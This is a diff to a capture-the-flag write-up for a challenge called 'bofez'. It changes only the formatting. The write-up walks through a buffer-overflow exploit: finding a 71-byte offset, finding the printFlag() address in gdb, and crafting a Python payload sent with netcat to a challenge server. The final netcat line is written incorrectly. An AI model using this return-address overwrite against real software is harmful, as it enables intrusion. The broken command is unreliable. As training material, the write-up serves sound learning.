@@ -14,12 +14,16 @@ The challenge name suggests that they should attempt a Buffer Overflow exploit.
 
 ### Solution
 1. Finding the offset
-   ```./bofez```<br />
+   ```console
+   root@mctf:~$ ./bofez
+   ```
    Spam "A"s as input until there is a segmentation fault<br />
    In this challenge, the offset was 71
 2. Finding the flag
    Upon disassembling the binary, the printFlag() function can be seen<br />
-   ```gdb bofez```<br />
+   ```console
+   root@mctf:~$ gdb bofez
+   ```
    To find the memory address of the printFlag() function, use ```info functions```<br />
    > printFlag() : 0x401192
 3. Convert the memory address
@@ -27,5 +31,9 @@ The challenge name suggests that they should attempt a Buffer Overflow exploit.
    > \x92\x11\x40
 4. Crafting the payload
    With the offset and memory address of the printFlag() function, craft the payload<br />
-   ```python -c "print 'A' * 71 + '\x92\x11\x40'" > payload```<br />
-   ```echo payload > nc 159.89.194.7 1342```
+   ```console
+   root@mctf:~$ python -c "print 'A' * 71 + '\x92\x11\x40'" > payload
+   ```
+   ```console
+   root@mctf:~$ echo payload > nc 159.89.194.7 1342
+   ```
